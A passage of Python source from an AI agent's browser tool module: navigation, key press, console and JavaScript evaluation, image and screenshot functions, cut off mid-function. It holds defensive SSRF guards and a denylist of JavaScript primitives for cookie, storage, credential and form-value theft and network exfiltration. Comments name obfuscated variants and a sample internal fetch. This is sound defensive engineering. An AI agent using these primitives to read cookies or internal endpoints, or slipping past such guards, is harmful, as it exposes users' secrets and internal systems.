def browser_back(task_id: Optional[str] = None) -> str:
    """
    Navigate back in browser history.

    Args:
        task_id: Task identifier for session isolation

    Returns:
        JSON string with navigation result
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_back
        return camofox_back(task_id)

    effective_task_id = _last_session_key(task_id or "default")
    result = _run_browser_command(effective_task_id, "back", [])

    if result.get("success"):
        # Browser history can land on a private/internal/cloud-metadata
        # address that the browser_navigate preflight never saw (e.g. a
        # redirect chain from an earlier legitimate navigation touched an
        # internal host, or client-side history was otherwise manipulated).
        # Re-check post-navigation, matching every other content-returning
        # entry point (browser_snapshot/vision/console/eval, and click/type/
        # press via _blocked_private_page_action) — the floor must fire for
        # every backend, not just the initial navigate.
        if _eval_ssrf_guard_active(effective_task_id):
            _blocked_url = _current_page_private_url(effective_task_id)
            if _blocked_url:
                return json.dumps({
                    "success": False,
                    "error": (
                        "Blocked: page URL targets a private or internal address "
                        f"({_blocked_url}). Browser history navigation (back) "
                        "landed on this address."
                    ),
                }, ensure_ascii=False)
        data = result.get("data", {})
        response = {
            "success": True,
            "url": data.get("url", "")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", "Failed to go back")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_press(key: str, task_id: Optional[str] = None) -> str:
    """
    Press a keyboard key.

    Args:
        key: Key to press (e.g., "Enter", "Tab")
        task_id: Task identifier for session isolation

    Returns:
        JSON string with key press result
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_press
        return camofox_press(key, task_id)

    effective_task_id = _last_session_key(task_id or "default")
    blocked = _blocked_private_page_action(effective_task_id, "press")
    if blocked is not None:
        return blocked
    result = _run_browser_command(effective_task_id, "press", [key])

    if result.get("success"):
        response = {
            "success": True,
            "pressed": key
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", f"Failed to press {key}")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def _blocked_private_page_action(effective_task_id: str, action: str) -> Optional[str]:
    """Return a blocked payload when an unsafe cloud page would receive input."""
    if not _eval_ssrf_guard_active(effective_task_id):
        return None
    blocked_url = _current_page_private_url(effective_task_id)
    if not blocked_url:
        return None
    return json.dumps({
        "success": False,
        "error": (
            "Blocked: page URL targets a private or internal address "
            f"({blocked_url}). Refusing to {action} on this page in this "
            "browser mode."
        ),
    }, ensure_ascii=False)


def browser_console(clear: bool = False, expression: Optional[str] = None, task_id: Optional[str] = None) -> str:
    """Get browser console messages and JavaScript errors, or evaluate JS in the page.

    When ``expression`` is provided, evaluates JavaScript in the page context
    (like the DevTools console) and returns the result.  Otherwise returns
    console output (log/warn/error/info) and uncaught exceptions.

    Args:
        clear: If True, clear the message/error buffers after reading
        expression: JavaScript expression to evaluate in the page context
        task_id: Task identifier for session isolation

    Returns:
        JSON string with console messages/errors, or eval result
    """
    # --- JS evaluation mode ---
    if expression is not None:
        policy_error = _enforce_browser_eval_policy(expression)
        if policy_error:
            return json.dumps({"success": False, "error": policy_error}, ensure_ascii=False)
        return _browser_eval(expression, task_id)

    # --- Console output mode (original behaviour) ---
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_console
        return camofox_console(clear, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    if _eval_ssrf_guard_active(effective_task_id):
        _blocked_url = _current_page_private_url(effective_task_id)
        if _blocked_url:
            return json.dumps({
                "success": False,
                "error": (
                    "Blocked: page URL targets a private or internal address "
                    f"({_blocked_url}). This may have been caused by a "
                    "JavaScript navigation via browser_console."
                ),
            }, ensure_ascii=False)

    console_args = ["--clear"] if clear else []
    error_args = ["--clear"] if clear else []

    console_result = _run_browser_command(effective_task_id, "console", console_args)
    errors_result = _run_browser_command(effective_task_id, "errors", error_args)

    # The normal console path tolerates one unavailable stream and returns the
    # other. A pinned tab disappearing is different: both streams refer to the
    # same invalid binding, so surface its structured recovery metadata.
    for command_result in (console_result, errors_result):
        if command_result.get("code") in {
            "tab_gone",
            "browser_session_retired",
        }:
            response = {
                "success": False,
                "error": command_result.get("error", "Pinned browser tab is gone"),
            }
            return json.dumps(
                _copy_fallback_warning(response, command_result),
                ensure_ascii=False,
            )

    messages = []
    if console_result.get("success"):
        for msg in console_result.get("data", {}).get("messages", []):
            messages.append({
                "type": msg.get("type", "log"),
                "text": _redact_browser_output(msg.get("text", "")),
                "source": "console",
            })

    errors = []
    if errors_result.get("success"):
        for err in errors_result.get("data", {}).get("errors", []):
            errors.append({
                "message": _redact_browser_output(err.get("message", "")),
                "source": "exception",
            })

    response = {
        "success": True,
        "console_messages": messages,
        "js_errors": errors,
        "total_messages": len(messages),
        "total_errors": len(errors),
    }
    _copy_fallback_warning(response, console_result)
    if errors_result.get("fallback_warning") and not response.get("fallback_warning"):
        _copy_fallback_warning(response, errors_result)
    return json.dumps(response, ensure_ascii=False)


def _eval_ssrf_guard_active(effective_task_id: str) -> bool:
    """Return True when eval-driven private-network access must be guarded.

    Matches the gating used by ``browser_navigate`` / ``browser_snapshot`` /
    ``browser_vision``: the SSRF guard is only meaningful for non-local
    backends (cloud browser, or a containerized terminal whose browser-on-host
    can reach internal networks the terminal can't), and is skipped for local
    sidecar sessions and when ``allow_private_urls`` is set.
    """
    return (
        not _is_local_backend()
        and not _is_local_sidecar_key(effective_task_id)
        and not _allow_private_urls()
    )


# URL-shaped literals embedded in a JS expression (http/https only).  Used to
# pre-screen ``browser_console(expression=...)`` calls that fetch/XHR/navigate
# to a private host directly — that path never updates ``location.href`` so the
# post-eval page-URL recheck below can't see it.
_JS_URL_LITERAL_RE = re.compile(r"""https?://[^\s'"`)\]<>]+""", re.IGNORECASE)


def _expression_targets_private_url(expression: str) -> Optional[str]:
    """Return the first private/always-blocked URL literal in a JS expression.

    Best-effort: scans for ``http(s)://...`` literals (fetch/XHR/navigation
    targets the agent may have embedded) and returns the first one that targets
    a private/internal address or the always-blocked cloud-metadata floor.
    Returns ``None`` when no such literal is found.
    """
    if not isinstance(expression, str):
        return None
    for match in _JS_URL_LITERAL_RE.findall(expression):
        candidate = match.rstrip(".,;")
        if _is_always_blocked_url(candidate) or not _is_safe_url(candidate):
            return candidate
    return None


def _current_page_private_url(effective_task_id: str) -> Optional[str]:
    """Return the current page URL when it targets a private/internal address.

    Reads ``window.location.href`` via a low-cost eval and returns it when the
    page has been navigated (e.g. via ``location.href = '...'`` in a prior
    eval) to an address the SSRF guard would reject.  Returns ``None`` when the
    page is public, the URL can't be determined, or the check errors (fail-open
    on probe failure, matching the snapshot/vision guards).
    """
    try:
        url_result = _run_browser_command(
            effective_task_id, "eval", ["window.location.href"],
            timeout=5, _engine_override="auto",
        )
        if url_result.get("success"):
            current_url = (
                url_result.get("data", {}).get("result", "")
                .strip().strip('"').strip("'")
            )
            if current_url and (
                _is_always_blocked_url(current_url) or not _is_safe_url(current_url)
            ):
                return current_url
    except Exception as exc:
        logger.debug("_current_page_private_url: probe failed (%s)", exc)
    return None


_RISKY_BROWSER_EVAL_PATTERNS: tuple[tuple[re.Pattern[str], str], ...] = (
    (re.compile(r"\bdocument\s*\.\s*cookie\b", re.I), "document.cookie"),
    (re.compile(r"\b(?:localStorage|sessionStorage)\b", re.I), "web storage"),
    (re.compile(r"\bindexedDB\b", re.I), "IndexedDB"),
    (re.compile(r"\bcaches\s*\.\s*(?:open|match|keys)\b", re.I), "Cache Storage"),
    (re.compile(r"\bnavigator\s*\.\s*(?:clipboard|credentials|serviceWorker)\b", re.I), "navigator sensitive API"),
    (re.compile(r"\b(?:fetch|XMLHttpRequest|WebSocket|EventSource)\s*\(", re.I), "network request"),
    (re.compile(r"\bnavigator\s*\.\s*sendBeacon\s*\(", re.I), "network beacon"),
    (re.compile(r"\bdocument\s*\.\s*forms\b.*\bvalue\b", re.I | re.S), "form value extraction"),
    (re.compile(r"\bquerySelector(?:All)?\s*\([^)]*(?:input|textarea|password)[^)]*\).*\bvalue\b", re.I | re.S), "form value extraction"),
)
_JS_STRING_LITERAL_RE = re.compile(
    r"""'(?:\\.|[^'\\])*'|\"(?:\\.|[^\"\\])*\"|`(?:\\.|[^`\\])*`""",
    re.S,
)
_SENSITIVE_BROWSER_EVAL_TOKENS: tuple[tuple[str, str], ...] = (
    ("cookie", "document.cookie"),
    ("localStorage", "web storage"),
    ("sessionStorage", "web storage"),
    ("indexedDB", "IndexedDB"),
    ("caches", "Cache Storage"),
    ("clipboard", "navigator sensitive API"),
    ("credentials", "navigator sensitive API"),
    ("serviceWorker", "navigator sensitive API"),
    ("fetch", "network request"),
    ("XMLHttpRequest", "network request"),
    ("WebSocket", "network request"),
    ("EventSource", "network request"),
    ("sendBeacon", "network beacon"),
)


def _allow_unsafe_browser_evaluate() -> bool:
    """Return whether sensitive browser JS evaluation is explicitly allowed.

    When true, ``browser_console(expression=...)`` runs without the
    sensitive-primitive denylist even if ``browser.restrict_evaluate`` is set.
    """
    try:
        from hermes_cli.config import read_raw_config

        cfg = read_raw_config()
        return is_truthy_value(cfg_get(cfg, "browser", "allow_unsafe_evaluate"), default=False)
    except Exception as e:
        logger.debug("Could not read browser.allow_unsafe_evaluate from config: %s", e)
        return False


def _restrict_browser_evaluate() -> bool:
    """Return whether the sensitive-primitive eval denylist is enabled.

    Off by default. ``browser_console(expression=...)`` is the agent's only
    programmatic page-inspection path, and the denylist blocks the *names* of
    common primitives (``fetch``, ``cookie``, ``querySelector(...input...)``)
    rather than any actual exfiltration — which also blocks a large class of
    legitimate DOM extraction (any selector or page script text containing
    those words). Egress itself is still gated by the SSRF/private-URL guards
    in ``_browser_eval`` regardless of this setting. Users who want the
    strict vocabulary denylist (e.g. when browsing hostile pages with a
    logged-in profile) opt in with ``browser.restrict_evaluate: true``;
    ``browser.allow_unsafe_evaluate: true`` overrides it back off.
    """
    try:
        from hermes_cli.config import read_raw_config

        cfg = read_raw_config()
        return is_truthy_value(cfg_get(cfg, "browser", "restrict_evaluate"), default=False)
    except Exception as e:
        logger.debug("Could not read browser.restrict_evaluate from config: %s", e)
        return False


def _decode_js_string_literal(literal: str) -> str:
    """Best-effort decode of a JavaScript string literal for policy checks.

    This is not a JS parser.  It only normalizes common escaped property names
    such as ``document["co\\x6fkie"]`` before the fail-closed sensitive-token
    check below.
    """
    if len(literal) < 2:
        return literal
    body = literal[1:-1]
    try:
        return bytes(body, "utf-8").decode("unicode_escape")
    except Exception:
        return body


def _decoded_js_string_literals(expression: str) -> list[str]:
    return [_decode_js_string_literal(match.group(0)) for match in _JS_STRING_LITERAL_RE.finditer(expression)]


def _sensitive_browser_eval_token_reason(expression: str) -> Optional[str]:
    """Return a risk reason for direct or quoted sensitive browser primitives.

    ``browser_console(expression=...)`` executes in the page origin.  A denylist
    that only searches direct spellings like ``document.cookie`` and ``fetch(``
    misses equivalent JavaScript property access such as ``document["cookie"]``
    or ``globalThis["fetch"](...)``.  Treat sensitive primitive names as risky
    whether they appear as identifiers or decoded string-literal property names.
    Concatenating all string literals catches simple obfuscations like
    ``document["coo" + "kie"]`` while the config opt-in preserves the escape
    hatch for trusted pages.
    """
    string_literals = _decoded_js_string_literals(expression)
    concatenated_literals = "".join(string_literals).lower()
    for token, reason in _SENSITIVE_BROWSER_EVAL_TOKENS:
        if re.search(rf"\b{re.escape(token)}\b", expression, re.I):
            return reason
        token_lower = token.lower()
        if any(token_lower in literal.lower() for literal in string_literals):
            return reason
        if token_lower in concatenated_literals:
            return reason
    return None


def _risky_browser_eval_reason(expression: str) -> Optional[str]:
    """Return a human-readable reason if a JS expression uses risky primitives."""
    if not expression:
        return None
    for pattern, reason in _RISKY_BROWSER_EVAL_PATTERNS:
        if pattern.search(expression):
            return reason
    return _sensitive_browser_eval_token_reason(expression)


def _enforce_browser_eval_policy(expression: str) -> Optional[str]:
    """Block sensitive browser JS evaluation when the opt-in denylist is on.

    The denylist is opt-in (``browser.restrict_evaluate: true``) because it
    gates on primitive *names*, which cripples legitimate DOM extraction —
    see ``_restrict_browser_evaluate``. Network egress to private/internal
    addresses is enforced separately in ``_browser_eval`` and does not depend
    on this policy.
    """
    if not _restrict_browser_evaluate():
        return None
    if _allow_unsafe_browser_evaluate():
        return None
    reason = _risky_browser_eval_reason(expression)
    if not reason:
        return None
    return (
        "Blocked: browser_console(expression=...) tried to use sensitive browser "
        f"JavaScript primitive ({reason}) while browser.restrict_evaluate is "
        "enabled. Use browser_snapshot/browser_get_images/browser_console "
        "without expression for normal inspection, or set "
        "browser.restrict_evaluate: false in config.yaml to allow "
        "programmatic evaluation."
    )


def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
    """Evaluate a JavaScript expression in the page context and return the result."""
    effective_task_id = _last_session_key(task_id or "default")

    # The supervisor is a direct CDP fast path that bypasses
    # _run_browser_command. Apply the same terminal ownership gate before a
    # stale supervisor can evaluate against a task that cleanup retired.
    if _is_browser_task_unavailable(effective_task_id):
        return json.dumps(
            _browser_session_retired_result(effective_task_id),
            ensure_ascii=False,
        )

    if _eval_ssrf_guard_active(effective_task_id):
        blocked_literal = _expression_targets_private_url(expression)
        if blocked_literal:
            return json.dumps({
                "success": False,
                "error": (
                    "Blocked: JavaScript expression targets a private or "
                    f"internal address ({blocked_literal}). Reading internal "
                    "endpoints via browser_console is not permitted in this "
                    "browser mode."
                ),
            }, ensure_ascii=False)

    # Camofox keeps its own raw-``task_id``-keyed session map, so pass the raw
    # id (matching every other Camofox tool) rather than the resolved
    # agent-browser session key.  The literal pre-scan above already ran.
    if _is_camofox_mode():
        return _camofox_eval(expression, task_id)

    # ── Private-network guard (eval return-value path) ──────────────────────
    # The literal pre-scan above closes the direct-fetch sub-path
    # (`fetch('http://127.0.0.1/secret')`).  The post-eval page-URL recheck
    # below closes the navigate-then-read sub-path (`location.href = '...'`
    # then read the DOM) — eval returns arbitrary JS results directly, never
    # touching snapshot/vision, so both sub-paths gate on the same condition.

    # --- Fast path: route through the supervisor's persistent CDP WS ---------
    # When a CDPSupervisor is alive for this task_id, ``Runtime.evaluate`` runs
    # on the already-connected WebSocket — zero subprocess startup cost vs
    # spawning an ``agent-browser eval`` CLI process. The subprocess remains a
    # compatibility path when no supervisor exists or the supervisor proves it
    # could not dispatch. Ambiguous post-dispatch failures are never replayed.
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
        supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    except ImportError:
        supervisor = None
    except Exception as exc:  # Registry lookup happens before JS dispatch.
        logger.debug("browser_eval: supervisor lookup failed (%s), falling back", exc)
        supervisor = None

    if supervisor is not None:
        # Hold the same per-task operation lock used by subprocess commands.
        # Without it, cleanup could enter RETIRING after the state check but
        # before Runtime.evaluate reached Chrome.
        bare_task_id = _bare_task_id_for_session_key(effective_task_id)
        with _task_cleanup_operation_lock(bare_task_id):
            if _is_browser_task_unavailable(effective_task_id):
                return json.dumps(
                    _browser_session_retired_result(effective_task_id),
                    ensure_ascii=False,
                )
            try:
                sup_result = supervisor.evaluate_runtime(expression)
            except Exception as exc:
                # A supervisor exists, so an exception may have happened after
                # the expression reached Chrome. Never turn an ambiguous
                # exception into a second execution through agent-browser.
                return json.dumps(
                    {
                        "success": False,
                        "error": f"{type(exc).__name__}: {exc}",
                        "code": "cdp_evaluate_failed",
                        "data": {"exception_type": type(exc).__name__},
                    },
                    ensure_ascii=False,
                )

        if sup_result.get("ok"):
            raw_result = sup_result.get("result")
            # Match the agent-browser path: if the value is a JSON string,
            # parse it so the model gets structured data.
            parsed = raw_result
            if isinstance(raw_result, str):
                try:
                    parsed = json.loads(raw_result)
                except (json.JSONDecodeError, ValueError):
                    pass  # keep as string
            # Post-eval page-URL recheck: if this (or a prior) eval
            # navigated the page to a private address, withhold the result.
            if _eval_ssrf_guard_active(effective_task_id):
                _blocked_url = _current_page_private_url(effective_task_id)
                if _blocked_url:
                    return json.dumps({
                        "success": False,
                        "error": (
                            "Blocked: page URL targets a private or internal "
                            f"address ({_blocked_url}). This may have been "
                            "caused by a JavaScript navigation via "
                            "browser_console."
                        ),
                    }, ensure_ascii=False)
            response = {
                "success": True,
                "result": _redact_browser_output(parsed),
                "result_type": type(parsed).__name__,
                "method": "cdp_supervisor",
            }
            return json.dumps(response, ensure_ascii=False, default=str)
        # Replay decisions use the supervisor's structured failure kind, never
        # page-controlled exception text. A JS exception can contain arbitrary
        # phrases such as "Target closed" and must still execute exactly once.
        err = sup_result.get("error") or "evaluate_runtime failed"
        failure_kind = sup_result.get("kind")
        failure_data = sup_result.get("data")
        if failure_kind == "js_exception":
            return json.dumps(
                {
                    "success": False,
                    "error": err,
                    "code": "javascript_exception",
                    "data": failure_data or {},
                },
                ensure_ascii=False,
            )
        if (
            failure_kind == "cdp_protocol"
            and isinstance(failure_data, dict)
            and failure_data.get("session_lost") is True
        ):
            # The pinned page was closed after the supervisor attached. Drop
            # the stale WS session and ask agent-browser, which owns the pin and
            # returns the structured ``tab_gone`` result.
            _stop_cdp_supervisor(effective_task_id)
        elif failure_kind == "supervisor_unavailable":
            # The expression was never dispatched, so the CLI owner is a safe
            # compatibility fallback.
            pass
        else:
            # Transport/protocol failures after dispatch are ambiguous: the
            # page may have executed the expression before the response was
            # lost. Surface the failure instead of replaying side effects.
            return json.dumps(
                {
                    "success": False,
                    "error": err,
                    "code": failure_kind or "cdp_evaluate_failed",
                    "data": failure_data or {},
                },
                ensure_ascii=False,
            )
        logger.debug(
            "browser_eval: supervisor path unavailable (%s), falling back to subprocess",
            err,
        )

    # --- Fallback: agent-browser CLI subprocess (original path) -------------
    result = _run_browser_command(effective_task_id, "eval", [expression])

    if not result.get("success"):
        err = result.get("error", "eval failed")
        # Detect backend capability gaps and give the model a clear signal
        if any(hint in err.lower() for hint in ("unknown command", "not supported", "not found", "no such command")):
            response = {
                "success": False,
                "error": f"JavaScript evaluation is not supported by this browser backend. {err}",
            }
            return json.dumps(_copy_fallback_warning(response, result))
        # A live DOM node / NodeList / Window can't be JSON-serialized by CDP
        # and fails the eval with "Object reference chain is too long". Turn
        # the cryptic protocol error into actionable guidance. Neither
        # path replays the expression: serialization can fail after JavaScript
        # side effects have already happened.
        if "reference chain is too long" in err.lower():
            response = {
                "success": False,
                "error": (
                    "Expression returned a live DOM node / NodeList / Window, "
                    "which can't be serialized. Extract a primitive value "
                    "(e.g. .innerText, .href, .src, .value) or use "
                    "JSON.stringify() / a snapshot tool instead."
                ),
            }
            return json.dumps(_copy_fallback_warning(response, result))
        response = {
            "success": False,
            "error": err,
        }
        return json.dumps(_copy_fallback_warning(response, result))

    data = result.get("data", {})
    raw_result = data.get("result")

    # The eval command returns the JS result as a string.  If the string
    # is valid JSON, parse it so the model gets structured data.
    parsed = raw_result
    if isinstance(raw_result, str):
        try:
            parsed = json.loads(raw_result)
        except (json.JSONDecodeError, ValueError):
            pass  # keep as string

    response = {
        "success": True,
        "result": _redact_browser_output(parsed),
        "result_type": type(parsed).__name__,
    }
    # Post-eval page-URL recheck: if this (or a prior) eval navigated the page
    # to a private address, withhold the result (mirrors the supervisor path).
    if _eval_ssrf_guard_active(effective_task_id):
        _blocked_url = _current_page_private_url(effective_task_id)
        if _blocked_url:
            return json.dumps({
                "success": False,
                "error": (
                    "Blocked: page URL targets a private or internal address "
                    f"({_blocked_url}). This may have been caused by a "
                    "JavaScript navigation via browser_console."
                ),
            }, ensure_ascii=False)
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False, default=str)


def _camofox_current_page_private_url(tab_id: str, user_id: str) -> Optional[str]:
    """Return the Camofox page URL when it targets a private/internal address.

    Camofox analogue of ``_current_page_private_url`` (evaluate endpoint instead
    of the agent-browser CLI).  Returns ``None`` when the page is public, the URL
    can't be determined, or the probe errors (fail-open on probe failure,
    matching the snapshot/vision guards — do not change to fail-closed without
    also changing the sibling).
    """
    try:
        from tools.browser_camofox import _post

        data = _post(
            f"/tabs/{tab_id}/evaluate",
            body={"expression": "window.location.href", "userId": user_id},
        )
        current_url = str(data.get("result") if isinstance(data, dict) else data or "")
        current_url = current_url.strip().strip('"').strip("'")
        if current_url and (_is_always_blocked_url(current_url) or not _is_safe_url(current_url)):
            return current_url
    except Exception as exc:
        logger.debug("_camofox_current_page_private_url: probe failed (%s)", exc)
    return None


def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
    """Evaluate JS via Camofox's /tabs/{tab_id}/evaluate endpoint (if available)."""
    from tools.browser_camofox import _ensure_tab, _post
    try:
        tab_info = _ensure_tab(task_id or "default")
        tab_id = tab_info.get("tab_id") or tab_info.get("id")
        user_id = tab_info["user_id"]
        resp = _post(f"/tabs/{tab_id}/evaluate", body={"expression": expression, "userId": user_id})

        # Camofox returns the result in a JSON envelope
        raw_result = resp.get("result") if isinstance(resp, dict) else resp
        parsed = raw_result
        if isinstance(raw_result, str):
            try:
                parsed = json.loads(raw_result)
            except (json.JSONDecodeError, ValueError):
                pass

        if _eval_ssrf_guard_active(task_id or "default"):
            _blocked_url = _camofox_current_page_private_url(tab_id, user_id)
            if _blocked_url:
                return json.dumps({
                    "success": False,
                    "error": (
                        "Blocked: page URL targets a private or internal address "
                        f"({_blocked_url}). This may have been caused by a "
                        "JavaScript navigation via browser_console."
                    ),
                }, ensure_ascii=False)

        return json.dumps({
            "success": True,
            "result": _redact_browser_output(parsed),
            "result_type": type(parsed).__name__,
        }, ensure_ascii=False, default=str)
    except Exception as e:
        error_msg = str(e)
        # Graceful degradation — server may not support eval
        if any(code in error_msg for code in ("404", "405", "501")):
            return json.dumps({
                "success": False,
                "error": "JavaScript evaluation is not supported by this Camofox server. "
                         "Use browser_snapshot or browser_vision to inspect page state.",
            })
        return tool_error(error_msg, success=False)


def _maybe_start_recording(task_id: str):
    """Start recording if browser.record_sessions is enabled in config."""
    with _cleanup_lock:
        if task_id in _recording_sessions:
            return
    try:
        from hermes_cli.config import read_raw_config
        hermes_home = get_hermes_home()
        cfg = read_raw_config()
        record_enabled = cfg_get(cfg, "browser", "record_sessions", default=False)

        if not record_enabled:
            return

        recordings_dir = hermes_home / "browser_recordings"
        recordings_dir.mkdir(parents=True, exist_ok=True)
        _cleanup_old_recordings(max_age_hours=72)

        timestamp = time.strftime("%Y%m%d_%H%M%S")
        recording_path = recordings_dir / f"session_{timestamp}_{task_id[:16]}.webm"

        result = _run_browser_command(task_id, "record", ["start", str(recording_path)])
        if result.get("success"):
            with _cleanup_lock:
                _recording_sessions.add(task_id)
            logger.info("Auto-recording browser session %s to %s", task_id, recording_path)
        else:
            logger.debug("Could not start auto-recording: %s", result.get("error"))
    except Exception as e:
        logger.debug("Auto-recording setup failed: %s", e)


def _maybe_stop_recording(task_id: str):
    """Stop recording if one is active for this session."""
    with _cleanup_lock:
        if task_id not in _recording_sessions:
            return
    try:
        result = _run_browser_command(task_id, "record", ["stop"])
        if result.get("success"):
            path = result.get("data", {}).get("path", "")
            logger.info("Saved browser recording for session %s: %s", task_id, path)
    except Exception as e:
        logger.debug("Could not stop recording for %s: %s", task_id, e)
    finally:
        with _cleanup_lock:
            _recording_sessions.discard(task_id)


def browser_get_images(task_id: Optional[str] = None) -> str:
    """
    Get all images on the current page.

    Args:
        task_id: Task identifier for session isolation

    Returns:
        JSON string with list of images (src and alt)
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_get_images
        return camofox_get_images(task_id)

    effective_task_id = _last_session_key(task_id or "default")

    # Use eval to run JavaScript that extracts images
    js_code = """JSON.stringify(
        [...document.images].map(img => ({
            src: img.src,
            alt: img.alt || '',
            width: img.naturalWidth,
            height: img.naturalHeight
        })).filter(img => img.src && !img.src.startsWith('data:'))
    )"""

    result = _run_browser_command(effective_task_id, "eval", [js_code])

    if result.get("success"):
        # ── Private-network guard (sibling of snapshot/vision/eval guards) ──
        if _eval_ssrf_guard_active(effective_task_id):
            _blocked_url = _current_page_private_url(effective_task_id)
            if _blocked_url:
                return json.dumps({
                    "success": False,
                    "error": (
                        "Blocked: page URL targets a private or internal address "
                        f"({_blocked_url}). This may have been caused by a "
                        "JavaScript navigation via browser_console."
                    ),
                }, ensure_ascii=False)

        data = result.get("data", {})
        raw_result = data.get("result", "[]")

        try:
            # Parse the JSON string returned by JavaScript
            if isinstance(raw_result, str):
                images = json.loads(raw_result)
            else:
                images = raw_result

            response = {
                "success": True,
                "images": _redact_browser_output(images),
                "count": len(images)
            }
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
        except json.JSONDecodeError:
            response = {
                "success": True,
                "images": [],
                "count": 0,
                "warning": "Could not parse image data"
            }
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", "Failed to get images")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_vision(question: str, annotate: bool = False, task_id: Optional[str] = None) -> Union[str, Dict[str, Any]]:
    """
    Take a screenshot of the current page for visual inspection.

    Captures what's visually displayed in the browser. When the active model
    supports native vision, the screenshot is attached directly to the
    conversation so the model can inspect it on the next turn; otherwise Hermes
    falls back to the auxiliary vision model and returns a text analysis. Useful
    for visual content the text-based snapshot may not capture (CAPTCHAs,
    verification challenges, images, complex layouts, etc.).

    The screenshot is saved persistently and its file path is returned so it
    can be shared with users via MEDIA:<path> in the response.

    Args:
        question: What you want to know about the page visually
        annotate: If True, overlay numbered [N] labels on interactive elements
        task_id: Task identifier for session isolation

    Returns:
        A JSON string with vision analysis results and screenshot_path, or a
        multimodal tool-result envelope carrying the screenshot and metadata.
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_vision
        return camofox_vision(question, annotate, task_id)

    import base64
    import uuid as uuid_mod
    from hermes_constants import get_hermes_dir
    screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
    screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
    effective_task_id = _last_session_key(task_id or "default")

    # ── Private-network guard: block vision from eval-navigated private pages ──
    # After any eval (browser_console) that may have changed location.href to a
    # private/internal address, the screenshot would expose private page content
    # to the vision model.  Re-check the current URL before capturing anything.
    if (
        not _is_local_backend()
        and not _is_local_sidecar_key(effective_task_id)
        and not _allow_private_urls()
    ):
        try:
            _url_result = _run_browser_command(
                effective_task_id, "eval", ["window.location.href"],
                timeout=5, _engine_override="auto",
            )
            if _url_result.get("success"):
                _current_url = (
                    _url_result.get("data", {}).get("result", "")
                    .strip().strip('"').strip("'")
                )
                if _current_url and not _is_safe_url(_current_url):
                    return json.dumps({
                        "success": False,
                        "error": (
                            "Blocked: page URL targets a private or internal address "
                            f"({_current_url}). This may have been caused by a "
                            "JavaScript navigation via browser_console."
                        ),
                    }, ensure_ascii=False)
        except Exception as _url_exc:
            logger.debug("browser_vision: URL safety check failed (%s)", _url_exc)

    # Lightpanda has no graphical renderer — pre-route screenshots to Chrome
    # via the fallback helper instead of letting the normal path fail with a
    # CDP error or return a placeholder PNG.  The normal analysis path below
    # still owns base64 encoding, provider routing, resizing retry, redaction,
    # and response shape.
    engine = _get_browser_engine()
    _lp_prerouted = False
    _lp_fallback_warning = None
    if engine == "lightpanda" and _should_inject_engine(engine):
        logger.debug("browser_vision: pre-routing screenshot to Chrome (engine=lightpanda)")
        screenshot_args = []
        if annotate:
            screenshot_args.append("--annotate")
        fb_result = _chrome_fallback_screenshot(
            effective_task_id, screenshot_args, _get_command_timeout(),
        )
        fb_reason = "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture."
        fb_result = _annotate_lightpanda_fallback(fb_result, fb_reason)
        if fb_result.get("success"):
            _lp_prerouted = True
            _lp_fallback_warning = fb_result.get("fallback_warning")
            fb_path = fb_result.get("data", {}).get("path", "")
            if fb_path and os.path.exists(fb_path):
                from hermes_constants import get_hermes_dir
                screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
                screenshots_dir.mkdir(parents=True, exist_ok=True)
                import shutil as _shutil_vision
                persistent_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
                _shutil_vision.copy2(fb_path, persistent_path)
                screenshot_path = persistent_path
        else:
            logger.warning("Lightpanda Chrome fallback vision screenshot failed: %s", fb_result.get("error"))
            # Fall through to the normal screenshot path so _run_browser_command
            # can still produce the standard fallback metadata/error.
            _lp_prerouted = False

    try:
        screenshots_dir.mkdir(parents=True, exist_ok=True)

        # Prune old screenshots (older than 24 hours) to prevent unbounded disk growth
        _cleanup_old_screenshots(screenshots_dir, max_age_hours=24)

        if _lp_prerouted and screenshot_path.exists():
            result = {
                "success": True,
                "data": {
                    "path": str(screenshot_path),
                    "fallback_warning": _lp_fallback_warning,
                    "browser_engine": "chrome",
                    "browser_engine_fallback": {
                        "from": "lightpanda",
                        "to": "chrome",
                        "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
                    },
                },
                "fallback_warning": _lp_fallback_warning,
                "browser_engine": "chrome",
                "browser_engine_fallback": {
                    "from": "lightpanda",
                    "to": "chrome",
                    "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
                },
            }
        else:
            # Take screenshot using agent-browser
            screenshot_args = []
            if annotate:
                screenshot_args.append("--annotate")
            screenshot_args.append("--full")
            screenshot_args.append(str(screenshot_path))
            result = _run_browser_command(
                effective_task_id,
                "screenshot",
                screenshot_args,
                # If the Lightpanda pre-route already failed, force Chrome so
                # _run_browser_command doesn't trigger a redundant LP fallback.
                _engine_override="auto" if _lp_prerouted else None,
            )

        if not result.get("success"):
            error_detail = result.get("error", "Unknown error")
            _cp = _get_cloud_provider()
            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
            error_response = {
                "success": False,
